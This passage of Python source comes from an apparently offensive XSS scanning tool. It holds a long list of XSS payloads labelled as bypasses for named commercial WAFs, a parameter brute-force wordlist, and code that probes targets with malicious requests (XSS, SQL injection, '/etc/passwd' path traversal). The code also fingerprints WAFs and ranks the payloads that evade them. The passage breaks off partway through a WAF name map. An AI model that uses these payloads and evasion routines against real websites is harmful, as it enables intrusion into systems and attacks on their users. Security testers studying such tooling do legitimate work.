        # Generic bypasses using constructor
        '<script>[]["\x66ilter"]["constructor"]("alert(1)")()</script>',
        '<script>[]["filter"]["cons"+"tructor"]("alert(1)")()</script>',
        '<svg onload=[]["\x66ilter"]["constructor"]("alert(1)")()>',
        
        # =================================================================
        # UNICODE FULL-WIDTH CHARACTERS
        # =================================================================
        '＜script＞alert(1)＜/script＞',  # Full-width characters
        '＜svg onload=alert(1)＞',
        '＜img src=x onerror=alert(1)＞',
        
        # =================================================================
        # PROTOTYPE POLLUTION XSS
        # =================================================================
        '__proto__[innerHTML]=<img src=x onerror=alert(1)>',
        'constructor[prototype][innerHTML]=<img/src=x onerror=alert(1)>',
        '__proto__.innerHTML=<img/src onerror=alert(1)>',
        
        # =================================================================
        # DOM CLOBBERING
        # =================================================================
        '<form id=x><input name=y value="javascript:alert(1)"></form>',
        '<a id=x name=y href="javascript:alert(1)"></a>',
        '<img name=x><img id=x name=y onerror=alert(1) src=x>',
        
        # =================================================================
        # CLOUDFLARE ADVANCED BYPASSES (2024-2026)
        # =================================================================
        '<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
        '<img src=x onerror=eval(atob`YWxlcnQoMSk=`)>',
        '<svg/onload=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>',
        '<details/open/ontoggle="self[`ale`+`rt`](1)">',
        "<img src=x onerror='al\\x65rt(1)'>",
        '<script>location=`javascript:al`+`ert(1)`</script>',
        '<script>open`javascript:ale`+`rt(1)`</script>',
        '<svg/onload=globalThis[`al`+`ert`](1)>',
        '<img src=x onerror=window?.alert?.(1)>',
        '<svg onload=top?.alert?.(1)>',
        
        # =================================================================
        # AKAMAI ADVANCED BYPASSES (2024-2026)
        # =================================================================
        '<script>\\u0065val("\\u0061l\\u0065rt(1)")</script>',
        '<img src=1 onerror\\x00=alert(1)>',
        '<svg><script>//%0aalert(1)</script>',
        '<svg/onload=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>',
        '<a href="\\x6aavascript:alert(1)">X</a>',
        '<script>globalThis[`\\x61lert`](1)</script>',
        '<img src=x onerror=al&#101rt(1)>',
        '<svg onload=al\\u{65}rt(1)>',
        
        # =================================================================
        # AWS WAF ADVANCED BYPASSES (2024-2026)
        # =================================================================
        '<script>\\u{61}lert(1)</script>',
        '<ScRiPt>alert(1)</ScRiPt><!--',
        '<sVg/OnLoAd=alert(1)>',
        '<img\\x09src=x\\x09onerror=alert(1)>',
        '<img\\x0asrc=x\\x0aonerror=alert(1)>',
        '<script\\x20src=data:,alert(1)></script>',
        '<svg onload=self[atob`YWxlcnQ`](1)>',
        '<img src=x onerror=self[atob`YWxlcnQ`](1)>',
        
        # =================================================================
        # AZURE WAF ADVANCED BYPASSES (2024-2026)
        # =================================================================
        '<img src onerror=\\x61lert(1)>',
        '<svg onload=al\\u0065rt(1)>',
        '<script>[][`constructor`][`constructor`]`alert(1)`()</script>',
        '<svg/onload=[][`flat`][`constructor`]`alert(1)`()>',
        '<img src=x onerror=Function`alert(1)`()>',
        
        # =================================================================
        # IMPERVA/INCAPSULA ADVANCED BYPASSES (2024-2026)
        # =================================================================
        '<img src=x onerror=al\\145rt(1)>',
        '<script>window["\\x61\\x6c\\x65\\x72\\x74"](1)</script>',
        '<script>top[/al/.source+/ert/.source](1)</script>',
        '<script>this[/alert/.source](1)</script>',
        '<img src=x onerror="Function(`ale`+`rt(1)``)()">',
        '<svg onload="[].constructor.constructor(`alert(1)`)()">',
        '<svg/onload=Reflect.apply(alert,null,[1])>',
        '<img src onerror=Reflect.construct(Function,[`alert(1)`])()>',
        
        # =================================================================
        # F5 BIG-IP ADVANCED BYPASSES (2024-2026)
        # =================================================================
        '<img src=1 onerror=alert(1)//>',
        '<script>/*/</script><script>alert(1)</script>',
        '<img src="x`onerror=`alert(1)">',
        "<script>'/*`/*--></style></title></textarea></noscript></template></script><svg onload=/*<script>*/alert(1)>",
        '<svg/onload=top[`al`+`ert`]`1`>',
        
        # =================================================================
        # MODSECURITY CRS ADVANCED BYPASSES (2024-2026)
        # =================================================================
        '<script>[].constructor.constructor("return this")().alert(1)</script>',
        '<script>with(document)alert(cookie)</script>',
        '<svg onload=(a=alert)(1)>',
        '<img src=x onerror=(confirm)(1)>',
        '<svg/onload=\'{alert`1`}>',
        '<script>\\x61\\x6c\\x65\\x72\\x74(1)</script>',
        '<img src=x onerror=\\x61\\x6c\\x65\\x72\\x74`1`>',
        
        # =================================================================
        # FORTIWEB ADVANCED BYPASSES (2024-2026)
        # =================================================================
        '<script>alert(1)/*</script>',
        '*/</script><script>alert(1)</script>',
        '<svg><script xlink:href=data:,alert(1) />',
        '<img src=x onerror="javascript:alert(1)">',
        '<math><mi//xlink:href="javascript:alert(1)">',
        '<form><button formaction=javascript&colon;alert(1)>X',
        
        # =================================================================
        # SUCURI ADVANCED BYPASSES (2024-2026)
        # =================================================================
        '<svg/onload=&#97lert(1)>',
        '<body onload=alert`1`>',
        '<x/onclick=alert(1)>click</x>',
        '<svg onload=alert(1)//  >',
        '<img src=x onerror = alert(1) >',
        
        # =================================================================
        # WORDFENCE ADVANCED BYPASSES (2024-2026)
        # =================================================================
        '<img src=x onerror=\nalert(1)>',
        '<svg/onload=alert(1)<!--',
        '<svg onload=top.alert(1)>',
        '<script>window.alert(1)</script>',
        '<svg onload=parent.alert(1)>',
        '<img src onerror=frames.alert(1)>',
        
        # =================================================================
        # CONSTRUCTOR CHAIN ADVANCED BYPASSES
        # =================================================================
        '<script>""["fontcolor"]["constructor"]("alert(1)")()</script>',
        '<script>(0)["constructor"]["constructor"]("alert(1)")()</script>',
        '<script>({})["constructor"]["constructor"]("alert(1)")()</script>',
        '<svg onload=[][[]["filter"]["constructor"]("alert(1)")()]>',
        '<script>"".__proto__.fontcolor.call(null,"a]ert(1)").p</script>',
        '<script>([]["entries"]()+"")[3]["constructor"]["constructor"]("alert(1)")()</script>',
        
        # =================================================================
        # HOMOGLYPH ATTACKS
        # =================================================================
        '<scrіpt>alert(1)</scrіpt>',
        '<ѕcript>alert(1)</ѕcript>',
        '<sсript>alert(1)</sсript>',
        '<img ѕrc=x onerror=alert(1)>',
        
        # =================================================================
        # PROTOTYPE POLLUTION EXTENDED
        # =================================================================
        '__proto__[srcdoc]=<script>alert(1)</script>',
        '__proto__[onclick]=alert(1)',
        'constructor.prototype.innerHTML=<img src onerror=alert(1)>',
        '__proto__[onload]=alert(1)',
        '__proto__[onerror]=alert(1)',
        
        # =================================================================
        # DOM CLOBBERING EXTENDED
        # =================================================================
        '<form id=document><input name=cookie value=1></form>',
        '<img id=getElementById><img name=body src=x onerror=alert(1)>',
        '<form id=window><input name=alert value=1></form>',
        '<a id=location href=javascript:alert(1)></a>',
        
        # =================================================================
        # TEMPLATE LITERAL BYPASSES
        # =================================================================
        '<script>eval`alert(1)`</script>',
        '<script>Function`x${{alert(1)}}`</script>',
        '<svg onload=`${alert(1)}`>',
        '<script>String.prototype.x=alert;``.x(1)</script>',
        
        # =================================================================
        # ASYNC/AWAIT BYPASSES
        # =================================================================
        '<script>async function x(){await alert(1)}x()</script>',
        '<script>(async()=>await alert(1))()</script>',
        '<script>Promise.resolve().then(alert)</script>',
        '<script>Promise.reject(1).catch(alert)</script>',
        '<script>new Promise(alert)</script>',
        
        # =================================================================
        # IMPORT/MODULE BYPASSES
        # =================================================================
        '<script type=module>import(`data:text/javascript,alert(1)`)</script>',
        '<script type=module>import("data:text/javascript,alert(1)")</script>',
        '<script type=importmap>{"imports":{}}</script><script type=module>alert(1)</script>',
        '<script type=module src=data:text/javascript,alert(1)>',
        
        # =================================================================
        # PROXY/REFLECT BYPASSES
        # =================================================================
        '<script>new Proxy({},{get:()=>alert(1)}).x</script>',
        '<script>Reflect.construct(Function,["alert(1)"])()</script>',
        '<script>({get x(){alert(1)}}).x</script>',
        '<script>Object.defineProperty(window,"x",{get:alert});x</script>',
        
        # =================================================================
        # GENERATOR/ITERATOR BYPASSES
        # =================================================================
        '<script>function*x(){yield alert(1)}x().next()</script>',
        '<script>(function*(){yield*[alert(1)]})().next()</script>',
        '<script>[...[1]][Symbol.iterator]().constructor.constructor("alert(1)")()</script>',
        '<script>for(x of[alert])x(1)</script>',
        
        # =================================================================
        # WEAKMAP/WEAKSET BYPASSES
        # =================================================================
        '<script>new WeakMap([[{},alert]]).get({})?.({x:1})</script>',
        '<script>Array.from(new Set([alert]))[0](1)</script>',
        
        # =================================================================
        # REGEXP BYPASSES
        # =================================================================
        '<script>/./[`constructor`](`alert(1)`)()</script>',
        '<script>/./.constructor("alert(1)")()</script>',
        '<script>RegExp.prototype.test=alert;/1/.test(1)</script>',
        
        # =================================================================
        # SYMBOL BYPASSES  
        # =================================================================
        '<script>({[Symbol.toPrimitive]:alert})+1</script>',
        '<script>Object.getOwnPropertySymbols({[Symbol()]:alert})[0]</script>',
        
        # =================================================================
        # INTL BYPASSES
        # =================================================================
        '<script>Intl?.Segmenter?.({},{segment:alert})</script>',
        
        # =================================================================
        # ERROR HANDLING BYPASSES
        # =================================================================
        '<script>try{throw 1}catch(e){alert(e)}</script>',
        '<script>try{}finally{alert(1)}</script>',
        '<svg onload="throw onerror=alert,1">',
        '<script>window.onerror=alert;throw 1</script>',
        
        # =================================================================
        # WEBSOCKET/FETCH BYPASSES
        # =================================================================
        '<script>fetch`javascript:alert(1)`</script>',
        '<script>navigator.sendBeacon(`javascript:alert(1)`)</script>',
        
        # =================================================================
        # MUTATION OBSERVER BYPASSES
        # =================================================================
        '<script>new MutationObserver(alert).observe(document,{childList:1})</script>',
        '<script>new IntersectionObserver(alert).observe(document.body)</script>',
        
        # =================================================================
        # SERVICE WORKER BYPASSES
        # =================================================================
        '<script>navigator.serviceWorker?.register(`data:text/javascript,alert(1)`)</script>',
        
        # =================================================================
        # AUDIO/VIDEO ADVANCED
        # =================================================================
        # '<video onloadeddata=alert(1) autoplay><source>',
        # '<video oncanplay=alert(1) autoplay><source>',
        # '<video onplaying=alert(1) autoplay><source>',
        # '<audio onloadstart=alert(1)><source>',
        # '<audio onsuspend=alert(1)><source>',
        
        # =================================================================
        # PICTURE ELEMENT BYPASSES
        # =================================================================
        # '<picture><source srcset=x onerror=alert(1)><img>',
        # '<picture><img src=x onerror=alert(1)>',
        
        # =================================================================
        # FORM ADVANCED BYPASSES
        # =================================================================
        '<form onformdata=alert(1)><button>',
        '<input type=image src=x onerror=alert(1)>',
        '<button form=x formaction=javascript:alert(1)>',
        
        # =================================================================
        # CSS INJECTION TO XSS
        # =================================================================
        '<style>@import url("javascript:alert(1)")</style>',
        '<link rel=stylesheet href="javascript:alert(1)">',
        '<style>*{background:url("javascript:alert(1)")}</style>',
        
        # =================================================================
        # XML/XSLT BYPASSES
        # =================================================================
        '<xml id=x><a><b>&lt;svg onload=alert(1)&gt;</b></a></xml>',
        '<?xml version="1.0"?><svg onload=alert(1)>',
        '<!--?xml version="1.0"?--><svg onload=alert(1)>',
    ]
    
    # Common XSS-Prone Parameters Wordlist (200+)
    # Used for parameter discovery and brute-forcing
    COMMON_XSS_PARAMS = [
        # Search & Query
        'q', 'query', 'search', 'keyword', 'keywords', 's', 'term', 'find',
        'searchterm', 'searchquery', 'searchword', 'searchtext', 'text',
        # User Input
        'input', 'name', 'username', 'user', 'email', 'mail', 'login',
        'password', 'pass', 'passwd', 'pwd', 'firstname', 'lastname',
        'fullname', 'nickname', 'bio', 'about', 'description', 'comment',
        'comments', 'message', 'msg', 'body', 'content', 'title', 'subject',
        # URLs & Redirects
        'url', 'uri', 'u', 'link', 'href', 'src', 'source', 'dest',
        'destination', 'redirect', 'redirect_url', 'redirect_uri', 'redir',
        'return', 'returnurl', 'return_url', 'returnto', 'return_to',
        'next', 'nexturl', 'next_url', 'goto', 'go', 'target', 'to', 'out',
        'continue', 'continueto', 'forward', 'fwd', 'location', 'path',
        # Page & View
        'page', 'p', 'view', 'v', 'action', 'act', 'do', 'cmd', 'command',
        'type', 't', 'mode', 'm', 'id', 'item', 'article', 'post', 'blog',
        'category', 'cat', 'section', 'tab', 'step', 'state', 'status',
        # File & Path
        'file', 'filename', 'filepath', 'path', 'dir', 'directory', 'folder',
        'doc', 'document', 'template', 'tpl', 'include', 'inc', 'load',
        'read', 'fetch', 'get', 'show', 'display', 'render', 'download',
        # AJAX & API
        'callback', 'cb', 'jsonp', 'jsonpcallback', 'function', 'func',
        'method', 'handler', 'process', 'data', 'json', 'xml', 'ajax',
        'api', 'format', 'output', 'response', 'result', 'payload',
        # HTML & DOM
        'html', 'htm', 'div', 'span', 'class', 'style', 'css', 'script',
        'code', 'tag', 'element', 'attribute', 'attr', 'value', 'val',
        'label', 'placeholder', 'tooltip', 'alt', 'caption', 'header',
        # Error & Debug
        'error', 'err', 'errormsg', 'error_message', 'debug', 'log', 'trace',
        'exception', 'warning', 'alert', 'notice', 'info', 'success', 'fail',
        # Language & Locale
        'lang', 'language', 'locale', 'l', 'country', 'region', 'timezone',
        # Sorting & Filtering
        'sort', 'sortby', 'order', 'orderby', 'filter', 'filterby', 'limit',
        'offset', 'from', 'to', 'start', 'end', 'min', 'max', 'range',
        # UI Elements
        'popup', 'modal', 'dialog', 'overlay', 'tooltip', 'menu', 'nav',
        'sidebar', 'widget', 'panel', 'frame', 'iframe', 'embed',
        # Form Fields
        'field', 'input', 'textarea', 'select', 'option', 'checkbox', 'radio',
        'button', 'submit', 'form', 'formfield', 'hidden',
        # Image & Media
        'image', 'img', 'photo', 'picture', 'pic', 'avatar', 'icon', 'logo',
        'banner', 'thumb', 'thumbnail', 'video', 'audio', 'media', 'upload',
        # Social
        'share', 'tweet', 'post', 'status', 'update', 'feed', 'timeline',
        'profile', 'wall', 'chat', 'reply', 'retweet', 'like', 'follow',
        # E-commerce
        'product', 'item', 'sku', 'price', 'qty', 'quantity', 'cart', 'order',
        'checkout', 'payment', 'coupon', 'discount', 'promo', 'promocode',
        # Auth & Session
        'token', 'csrf', 'nonce', 'session', 'sid', 'ssid', 'auth', 'key',
        'apikey', 'api_key', 'access_token', 'refresh_token', 'jwt',
        # Misc Common
        'ref', 'referrer', 'referer', 'origin', 'source', 'campaign',
        'utm_source', 'utm_medium', 'utm_campaign', 'tracking', 'track',
        'analytics', 'event', 'click', 'action', 'trigger', 'hook',
        # ASP.NET Specific
        '__VIEWSTATE', '__EVENTVALIDATION', '__EVENTTARGET', '__EVENTARGUMENT',
        'txtSearch', 'txtName', 'txtEmail', 'txtPassword', 'txtUsername',
        'ddlCategory', 'ddlType', 'hdnValue', 'hdnId',
        # PHP Common
        'id', 'pid', 'uid', 'cid', 'tid', 'aid', 'bid', 'fid', 'gid',
        'action', 'module', 'controller', 'task', 'op', 'option', 'func',
        # Java/Spring
        'requestId', 'transactionId', 'correlationId',
        # Node.js/Express
        'req', 'res', 'params', 'query', 'body', 'headers',
        # WordPress
        'post_title', 'post_content', 'post_excerpt', 'meta_key', 'meta_value',
        'widget_id', 'sidebar_id', 'menu_id', 'theme', 'template',
        # Drupal
        'node', 'nid', 'tid', 'vid', 'uid', 'destination', 'render',
        # XSS Probe Params
        'x', 'y', 'z', 'a', 'b', 'c', 'test', 'debug', 'dev', 'admin',
        'preview', 'demo', 'sample', 'example', 'param', 'arg', 'var',
    ]
    
    def __init__(self, target, max_depth=3, timeout=10, threads=5, verbose=False, custom_payloads=None, first_only=True, waf_bypass=False, param_discovery=True, brute_params=True, force_test=True, deep_scan=False, wayback_limit=50):
        self.target = self._normalize_url(target)
        self.max_depth = max_depth
        self.timeout = timeout
        self.threads = threads  # Fix: Store threads for use in other methods
        self.verbose = verbose
        self.first_only = first_only  # Stop after first successful payload per param
        self.waf_bypass = waf_bypass  # Enable WAF bypass mode
        self.param_discovery = param_discovery  # Enable advanced parameter discovery
        self.brute_params = brute_params  # Enable parameter brute-forcing
        self.force_test = force_test  # Force test common params even when none discovered
        self.deep_scan = deep_scan  # Enable deep scanning (comprehensive test)
        self.wayback_limit = wayback_limit  # Limit for Wayback URLs ('all' or int)
        self.waf_detected = None  # Will store detected WAF name
        self.waf_info = {}  # Store WAF detection details
        self.visited = set()
        self.found_params = {}  # Base URL -> discovered GET/POST parameter names
        # Preserve a small, session-local sample of real GET query templates.
        # The base URL map above intentionally strips query strings, so without
        # this companion map SQL diagnostics cannot retain required sibling
        # parameters or infer a parameter's original value/context.
        self.get_query_templates = {}  # Base URL -> [full GET URL samples]
        self.vulnerabilities = []
        self.tested_params = set()  # Track which params already have confirmed vulns
        self.custom_payloads = custom_payloads  # User-provided payload list
        self.discovered_params = set()  # Track all discovered parameters
        self.working_bypass_payloads = [] # Store payloads that successfully bypassed WAF
        self.session = requests.Session()
        

        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
        })
    
    def get_payloads(self):
        """Get payloads to use - custom if provided, otherwise built-in (with WAF bypass if enabled)"""
        if self.custom_payloads:
            return self.custom_payloads
            
        # Refined Logic: Only use WAF bypass payloads if WAF bypass is enabled AND a WAF is actually detected
        # This prevents wasting time sending heavy payloads to a site with no WAF
        if self.waf_bypass:
            if self.waf_detected:
                # Prioritize identified working bypass payloads
                all_payloads = self.WAF_BYPASS_PAYLOADS + self.PAYLOADS
                if self.working_bypass_payloads:
                     # Put proven working payloads at HEAD
                    return self.working_bypass_payloads + all_payloads
                return all_payloads
            else:
                # WAF bypass enabled but no WAF detected
                # We can either warn and skip, or just skip. 
                # Let's check if we've already warned
                if not hasattr(self, '_waf_warn_shown'):
                    print(f"{Fore.YELLOW}[!] WAF Bypass enabled but no WAF detected. Skipping bypass payloads for efficiency.{Style.RESET_ALL}")
                    self._waf_warn_shown = True
                return self.PAYLOADS
                
        return self.PAYLOADS
    
    def detect_waf(self):
        """Detect WAF protecting the target by sending a malicious probe request"""
        print(f"\n{Fore.CYAN}[*] Detecting WAF protection...{Style.RESET_ALL}")
        
        # Test probe - a clearly malicious payload to trigger WAF
        probe_payloads = [
            '<script>alert(1)</script>',
            '"><svg onload=alert(1)>',
            "' OR '1'='1",
            '../../../etc/passwd',
        ]
        
        # Track if we had ANY successful response
        successful_probes = 0
        connection_errors = 0
        detected_wafs = []
        
        for probe in probe_payloads:
            try:
                # Try GET request with probe
                test_url = f"{self.target}?xss_test={probe}"
                response = self.session.get(test_url, timeout=self.timeout, verify=False, allow_redirects=True)
                successful_probes += 1
                
                # Analyze response for WAF signatures
                waf_result = self._analyze_response_for_waf(response)
                if waf_result:
                    detected_wafs.extend(waf_result)
                
                time.sleep(0.2)
                
            except requests.exceptions.RequestException as e:
                connection_errors += 1
                if self.verbose:
                    print(f"{Fore.YELLOW}[~] Probe request failed: {e}{Style.RESET_ALL}")
                continue
        
        # Also check a normal request for WAF signatures
        try:
            response = self.session.get(self.target, timeout=self.timeout, verify=False)
            successful_probes += 1
            waf_result = self._analyze_response_for_waf(response)
            if waf_result:
                detected_wafs.extend(waf_result)
        except:
            connection_errors += 1
        
        # Deduplicate and prioritize
        detected_wafs = list(set(detected_wafs))
        
        if detected_wafs:
            # Remove generic_waf if specific WAF was found
            if len(detected_wafs) > 1 and 'generic_waf' in detected_wafs:
                detected_wafs.remove('generic_waf')
            
            self.waf_detected = detected_wafs[0]  # Primary WAF
            self.waf_info['all_detected'] = detected_wafs
            
            self.waf_info['all_detected'] = detected_wafs
            
            self._print_waf_detection_result(detected_wafs)
            
            # If WAF detected and bypass enabled, try to identify specific working bypass payloads
            if self.waf_bypass:
                self._identify_working_bypass()
            
    def _identify_working_bypass(self):
        """Proactively identify which bypass payloads work against the detected WAF"""
        print(f"{Fore.CYAN}[*] Testing WAF bypass payloads to identify effective vectors...{Style.RESET_ALL}")
        
        # Test a subset of high-probability bypass payloads
        test_candidates = self.WAF_BYPASS_PAYLOADS[:30] + self.WAF_BYPASS_PAYLOADS[-10:]
        
        # Use a dummy parameter that is likely reflected or at least processed
        dummy_param = "q"
        base_url = self.target
        
        working_count = 0
        
        # Use ThreadPool for speed
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_payload = {}
            for payload in test_candidates:
                if '?' in base_url:
                    test_url = f"{base_url}&{dummy_param}={payload}"
                else:
                    test_url = f"{base_url}?{dummy_param}={payload}"
                
                future_to_payload[executor.submit(self.session.get, test_url, timeout=5, verify=False)] = payload
            
            for future in concurrent.futures.as_completed(future_to_payload):
                payload = future_to_payload[future]
                try:
                    response = future.result()
                    # Check if NOT blocked (403/406/50x are usually blocks)
                    if response.status_code == 200:
                        self.working_bypass_payloads.append(payload)
                        working_count += 1
                        if self.verbose:
                            print(f"{Fore.GREEN}[+] Potential bypass found: {payload[:30]}...{Style.RESET_ALL}")
                        
                        # Stop if we found enough working examples to prioritize
                        if working_count >= 5:
                            executor.shutdown(wait=False)
                            break
                except:
                    pass
        
        if working_count > 0:
            print(f"{Fore.GREEN}[+] Identified {working_count} potential bypass payloads! Prioritizing them in scan.{Style.RESET_ALL}")
            # Add these to top of list
            self.working_bypass_payloads = list(set(self.working_bypass_payloads)) # Dedup
    
    def _analyze_response_for_waf(self, response):
        """Analyze HTTP response for WAF signatures"""
        detected_wafs = []
        
        headers_lower = {k.lower(): v.lower() for k, v in response.headers.items()}
        body_lower = response.text.lower()
        server = headers_lower.get('server', '')
        cookies = {k.lower(): v for k, v in response.cookies.items()}
        
        for waf_name, signatures in self.WAF_SIGNATURES.items():
            score = 0
            matches = []
            
            # Check headers
            if 'headers' in signatures:
                for header in signatures['headers']:
                    if header.lower() in headers_lower:
                        score += 2
                        matches.append(f"header:{header}")
            
            # Check server header
            if 'server' in signatures:
                for srv in signatures['server']:
                    if srv.lower() in server:
                        score += 3
                        matches.append(f"server:{srv}")
            
            # Check body patterns
            if 'body' in signatures:
                for pattern in signatures['body']:
                    if pattern.lower() in body_lower:
                        score += 2
                        matches.append(f"body:{pattern[:30]}")
            
            # Check cookies
            if 'cookies' in signatures:
                for cookie in signatures['cookies']:
                    if cookie.lower() in cookies or any(cookie.lower() in k for k in cookies.keys()):
                        score += 2
                        matches.append(f"cookie:{cookie}")
            
            # Check status codes that may indicate WAF
            if response.status_code in [403, 406, 429, 503]:
                score += 1
            
                if self.verbose:
                    print(f"{Fore.BLUE}[~] Checking {waf_name}: Score {score} (Initial){Style.RESET_ALL}")

            if score >= 2:
                detected_wafs.append(waf_name)
                self.waf_info[waf_name] = {
                    'score': score,
                    'matches': matches,
                    'status_code': response.status_code
                }
                
                if self.verbose:
                    print(f"{Fore.GREEN}[+] WAF match: {waf_name} (Score: {score}){Style.RESET_ALL}")
            elif score > 0 and self.verbose:
                 print(f"{Fore.YELLOW}[?] Partial WAF match: {waf_name} (Score: {score} - Insufficient){Style.RESET_ALL}")
        
        return detected_wafs
    
    def _print_waf_detection_result(self, detected_wafs):
        """Print WAF detection results in a formatted box"""
        waf_names = {
            # 360 Technologies
            '360panyun': '🔄 360 PanYun',
            '360wangzhanbao': '🔄 360 WangZhanBao',
            '360waf': '🔄 360 WAF',
            # Major Cloud/CDN WAFs
            'cloudflare': '☁️ Cloudflare',
            'cloudfloor': '🌐 Cloudfloor DNS',
            'cloudfront': '🔶 Amazon CloudFront',
            'akamai': '🌐 Akamai',
            'kona_sitedefender': '🌐 Akamai Kona',
            'aws_waf': '🔶 AWS WAF',
            'aws_elb': '🔶 AWS ELB',
            'google_cloud_armor': '🔵 Google Cloud Armor',
            'azure_waf': '💠 Azure WAF',
            'azure_frontdoor': '💠 Azure Front Door',
            'oracle_cloud': '🔴 Oracle Cloud',
            # F5 Networks
            'f5_bigip': '⚡ F5 BIG-IP',
            'f5_asm': '⚡ F5 ASM',
            'f5_ltm': '⚡ F5 LTM',
            'firepass': '⚡ F5 FirePass',
            'trafficshield': '⚡ F5 TrafficShield',
            # Fortinet
            'fortigate': '🏰 FortiGate',
            'fortiweb': '🏰 FortiWeb',
            'fortiguard': '🏰 FortiGuard',
            # Imperva
            'imperva': '🔒 Imperva/Incapsula',
            'securesphere': '🔒 Imperva SecureSphere',
            # Citrix
            'netscaler': '🍊 Citrix NetScaler',
            'teros': '🍊 Citrix Teros',
            # Barracuda
            'barracuda': '🐟 Barracuda WAF',
            'netcontinuum': '🐟 NetContinuum',
            # Radware
            'radware': '📡 Radware AppWall',
            # Palo Alto
            'palo_alto': '🔥 Palo Alto Networks',
            # Chinese WAFs
            'alibaba_waf': '🔴 Alibaba/AliYunDun',
            'tencent_waf': '🐧 Tencent WAF',
            'qcloud': '🐧 Tencent QCloud',
            'baidu_waf': '🐾 Baidu/Yunjiasu',
            'nsfocus': '🎯 NSFOCUS',
            'knownsec': '🔐 Knownsec KS-WAF',
            'jiasule': '🔐 Jiasule',
            'yundun': '☁️ Yundun',
            'anquanbao': '🛡️ Anquanbao',
            'anyu': '🛡️ AnYu',
            'safedog': '🐕 Safedog',
            'safeline': '🛡️ Safeline',
            'chuangyushield': '🛡️ Chuang Yu Shield',
            'huawei_waf': '📡 Huawei Cloud WAF',
            'bluedon': '🔵 Bluedon',
            'west263': '🌐 West263 CDN',
            'chinacache': '🌐 ChinaCache',
            'cdnns': '🌐 CdnNS',
            'puhui': '🛡️ Puhui',
            'qiniu': '🌐 Qiniu CDN',
            'eisoo': '☁️ Eisoo Cloud',
            'xuanwudun': '🛡️ Xuanwudun',
            'yunsuo': '☁️ Yunsuo',
            'senginx': '🛡️ SEnginx/Neusoft',
            'powercdn': '⚡ PowerCDN',
            # Security Vendors
            'sucuri': '🌿 Sucuri',
            'stackpath': '📦 StackPath',
            'edgecast': '🎯 Edgecast/Verizon',
            'fastly': '⚡ Fastly',
            'keycdn': '🔑 KeyCDN',
            'limelight': '💡 Limelight CDN',
            'maxcdn': '📊 MaxCDN/NetDNA',
            'beluga': '🐋 Beluga CDN',
            'cachefly': '🚀 CacheFly',
            'airee': '🌐 AireeCDN',
            # Bot Protection & Anti-DDoS
            'reblaze': '🔄 Reblaze',
            'datadome': '📊 DataDome',
            'perimeterx': '🔲 PerimeterX',
            'distil': '🔷 Distil Networks',
            'kasada': '🔮 Kasada',
            'ddos_guard': '🛡️ DDoS-GUARD',
            'dosarrest': '🛡️ DOSarrest',
            'nullddos': '🛡️ NullDDoS',
            'blockdos': '🛡️ BlockDoS',
            'qrator': '🛡️ Qrator',
            'variti': '🛡️ Variti',
            'threatx': '🛡️ ThreatX/A10',
            # Enterprise WAFs
            'checkpoint': '✅ Check Point',
            'juniper': '🌲 Juniper',
            'sonicwall': '🧱 SonicWall/Dell',
            'watchguard': '👁️ WatchGuard',
            'datapower': '💼 IBM DataPower',
            'webseal': '💼 IBM WebSEAL',
            # Open Source WAFs
            'modsecurity': '🛡️ ModSecurity',
            'naxsi': '🛡️ NAXSI',
            'shadow_daemon': '👤 Shadow Daemon',
            'openresty': '🌐 OpenResty',
            'varnish': '🔷 Varnish/CacheWall',
            'envoy': '🌐 Envoy Proxy',
            # WordPress/CMS WAFs
            'wordfence': '🐺 Wordfence',
            'bulletproof_security': '🔫 BulletProof Security',
            'secupress': '🔒 SecuPress',
            'ninjaFirewall': '🥷 NinjaFirewall',
            'cerber_security': '🔒 WP Cerber',
            'shield_security': '🛡️ Shield Security',
            'malcare': '🛡️ Malcare',
            'webarx': '🌐 WebARX',
            'wpmudev': '🔧 wpmudev WAF',
            'rsfirewall': '🔥 RSFirewall',
            'crawlprotect': '🕷️ CrawlProtect',
            'expression_engine': '📝 Expression Engine',
            # Hosting/Platform WAFs
            'siteground': '🏠 SiteGround',
            'godaddy': '🟢 GoDaddy',
            'squarespace': '⬛ Squarespace',
            'wix_waf': '🎨 Wix WAF',
            'litespeed': '⚡ LiteSpeed',
            'imunify360': '🛡️ Imunify360',
            'bitninja': '🥷 BitNinja',
            'virusdie': '🦠 VirusDie',
            # Middle East/Iran
            'arvancloud': '☁️ ArvanCloud',
            # Other Security Solutions
            'comodo': '🐉 Comodo cWatch',
            'wallarm': '🧱 Wallarm',
            'armor': '🛡️ Armor Defense',
            'denyall': '🚫 DenyAll',
            'airlock': '🔐 Airlock',
            'profense': '🛡️ Profense',
            'sitelock': '🔒 SiteLock TrueShield',
            'zenedge': '🔷 Zenedge/Oracle',
            'alert_logic': '🚨 Alert Logic',
            'approach': '🛡️ Approach',
            'astra': '⭐ Astra/Czar',
            'barikode': '🛡️ Barikode',
            'baffin_bay': '💳 Baffin Bay/Mastercard',
            'bekchy': '🛡️ Bekchy',
            'binarysec': '🔢 BinarySec',
            'cloud_protector': '☁️ Cloud Protector',
            'cloudbric': '☁️ Cloudbric',
            'dotdefender': '🔵 DotDefender',
            'dynamicweb': '🌐 DynamicWeb',
            'greywizard': '🧙 Greywizard',
            'hyperguard': '🛡️ HyperGuard',
            'indusguard': '🛡️ IndusGuard',
            'instart': '🚀 Instart DX',
            'janusec': '🚪 Janusec',
            'kemp': '⚖️ Kemp LoadMaster',
            'link11': '🔗 Link11 WAAP',
            'mission_control': '🎮 Mission Control',
            'nemesida': '🛡️ Nemesida',
            'nevisproxy': '🛡️ NevisProxy',
            'newdefend': '🆕 Newdefend',
            'nexusguard': '🛡️ NexusGuard',
            'onmessage_shield': '📧 OnMessage Shield',
            'pt_appfirewall': '🛡️ PT Application Firewall',
            'pentawaf': '⭐ PentaWAF',
            'raywaf': '🌊 RayWAF',
            'sabre': '⚔️ Sabre Firewall',
            'safe3': '🔢 Safe3 WAF',
            'secking': '👑 SecKing',
            'secure_entry': '🔐 Secure Entry',
            'serverdefender': '🖥️ ServerDefender VP',
            'siteguard': '🛡️ SiteGuard',
